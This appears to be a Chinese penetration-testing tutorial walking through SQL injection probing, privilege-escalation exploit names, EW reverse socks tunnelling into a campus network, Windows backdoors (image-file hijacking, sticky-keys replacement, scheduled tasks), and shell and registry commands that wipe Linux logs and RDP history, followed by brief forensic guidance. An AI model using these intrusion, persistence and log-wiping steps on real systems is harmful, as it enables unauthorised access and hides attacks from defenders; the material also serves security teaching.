在渗透测试中，万事开头难，为了取得系统的权限，早期的信息收集阶段通常是最重要的。

## 漏洞验证阶段

在Web安全方面，可分为SQL注入、XSS漏洞、CSRF攻击、SSRF攻击、SSTI模板注入漏洞、命令执行等攻击方法，这里我将使用最朴素且破坏性最强的SQL注入攻击。

* SQL注入漏洞成因

SQL注入产生的实质是因为恶意代码被伪装成正常的输入数据，与输入命令拼接在一起，成为可执行命令，提交到服务器的数据库。其漏洞产生原因主要是由于编程人员Web安全知识不足或缺少安全编程经验，编写的代码不完善。

* SQL注入测试

要执行SQL注入，首先得判断目标是否存在SQL注入，使用最基本的注入语句and 1=1、and 1=2，这两条语句的意思表示假和真，当语句为真时，返回正确页面，当语句为假时，则显示空白页面，当语句成功执行后，我们可以进一步得到我们想要的信息，使用order by语句进行列查找，order by 一个数列…，当order by n， n-1时返回一个正常的页面，则说明当前数据表有n-1个字段，知道字段后我们可以进一步的测试，使用union联合查询法，联合查询发是将多个select查询结果放在一起回显数据，利用这一特点进行拼接，得到想要的信息，语句如下union select字段数，字段上可以使用系统函数、查表语句、查列语句，甚至可以直接查询数据

### 权限提升

一般情况下，如果我们在渗透测试中拿到了系统的Shell，权限都是非常低的，大多数权限都是Guest或者Users组权限，这样会使我们的操作受到很多限制，如果要进行横向攻击或清除日志，不提高自己的权限，操作起来是非常困难的。

一般来说提权方法分为两类，即纵向提权和横向提权

纵向提权：低权限角色得到高权限角色的权限。

例子：小明在某家百货公司里当刷马桶的，突然有一天，老板看见小明的马桶刷得干干净净，直接退位把小明抬上了CEO的位置。从系统角度来说，相当于Guest来宾用户权限提到了Administrator管理员权限。

横向提权：得到同级别的权限

例子：小明在排队的时候，编号为12，并不知道前后面的编号是多少，于是小明一个个去问，去了解他们的姓名。在这时候就好比user1不知道user2信息，通过横向提权，获得到了user2的信息。

![image.png](images/img_19280_033.png)

一般拿到低权限shell，例如webshell或服务器低权限shell，基本提权思路如下

（1） 获权主机信息

（2） 寻找EXP利用

（3） 尝试提权到高权限用户

（4） 添加隐藏账户

Linux下提权

Linux常用提权方法，内核漏洞提权、SUDO提权、通配符注入等，常用的提权漏洞如下。

CVE-2021-33909、CVE-2021-3156、CVE-2020-14386、CVE-2014-9922、CVE-2021-22555、CVE-2017-7184、CVE-2021-33909、CVE-2017-16939、…

Windows下提权

Windows下常用访问方法，可以通过系统内核漏洞，或者错误的服务权限配置，再然后就是dll 注入，凭据存储等，常用的提权漏洞如下。

MS16-032、巴西烤肉、CVE-2016-0095、土豆家族、…

在这里可以使用CS导出凭据信息方便接下来的渗透。

接下来使用Kali Linux反弹Socks5服务器，使用命令，socks5proxy -s rcsocks -l 1080 -e 26254，接着在XX校园网上使用EW反弹到Kali Linux的Socks5，端口为26254。使用命令，socks5proxywin -s rssocks -d xxx.xxx.xxx.xxx -e 26254。执行命令成功后即可在Kali Linux上配置socks信息，打开/etc/proxychains.conf文件，新增本地代理为socks5 127.0.0.1 1080，在Kali上使用命令proxy ping 127.0.0.1，回显成功即表示代理成功。

### 后门技术

有时候，黑客往往会暂时退出渗透测试，为了以后的日子里可以随时进行连接，黑客往往会在系统看不见的地方留下特殊程序或用户,接下来有几种常见的后门技术。

（1）映像劫持

映像劫持，简单来说就是当目标系统被映像劫持攻击时，如果我们启动目标程序，启动后的是劫持后的程序而不是系统本来的程序

具体操作步骤，打开注册表，如图打开注册表项

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option
```

在里边添加一个项，然后在项中添加恶意键值，键值为我们恶意程序的路径。

（2）Shift后门

Shift在日常生活中很常见，在windows中起到了辅助功能，能在用户未登录操作系统之前启动它，下图是Shift键的一些辅助功能

```
C:\Windows\System32\sethc.exe # press 5 times shift key
C:\Windows\System32\utilman.exe # windows+U
```

在早的Windows中，可以直接把setch.exe覆盖成恶意程序。

（3）计划任务

在Windows下设置定时任务有两条命令，分别是at和schtasks，它们的主要区别是at命令在新版操作系统中是不能将任务放在前台执行的，也就是说会启用一条进程，而schtasks是将定时的任务放在前台执行的。

## 痕迹清除

当渗透测试结束后，如果测试人员不想进一步测试或者临时离开测试环境，可以对系统日志进行清除。

在Linux清除日志的命令

```
#!/bin/sh
cat /dev/null >/var/log/syslog
cat /dev/null >/var/adm/sylog
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/maillog
cat /dev/null >/var/log/messages
cat /dev/null > /var/log/openwebmail.log
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/secure
cat /dev/null >/var/log/httpd/error_log
cat /dev/null >/var/log/httpd/ssl_error_log
cat /dev/null >/var/log/httpd/ssl_request_log
cat /dev/null >/var/log/httpd/ssl_access_log
```

Windows下清空远程桌面连接记录如下

```
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client" /f del /a /f /q %HOMEPATH%\Documents\Default.rdp
```

在Windows桌面下清除日志步骤如下

```
开始 - 程序 - 管理工具 - 计算机管理 - 系统工具 - 事件查看器，然后清除日志
```

# 分析溯源

现在，得站在被攻击者的角度上看，黑客已经侵入到了服务器，但是黑客并没有对服务器进行增删改，为此，分析溯源将从两个角度去看。

第一个是进行时，也就是应急响应，在这种情况下，服务器是正在遭受黑客攻击的，工程师需实时跟黑客进行对抗。

第二个是过去时，也就是已经发生了的，在这种情况下，分析溯源可以查到很多东西，如黑客在某某文件夹做了什么手脚，这时候我们可以通过降序来查看文件夹的修改日期，或者通过Windows事件日志文件进行分析。

Windows日志会随着系统的运行而不断更新记录日志信息。根据种类可以分为事件日志、IIS日志、FTP日志，数据库日志，邮件服务日志等。

事件日志

输入eventvwr.msc 打开事件查看器，查看日志

Windows事件日志文件非常强大，基本上记录了操作系统的一举一动，其中包括了系统的安全，一些应用程序的运行/出错记录，每个记录的事件都包含了非常详细的元素，以便运维人员进行数字取证，从而分析目标来源。
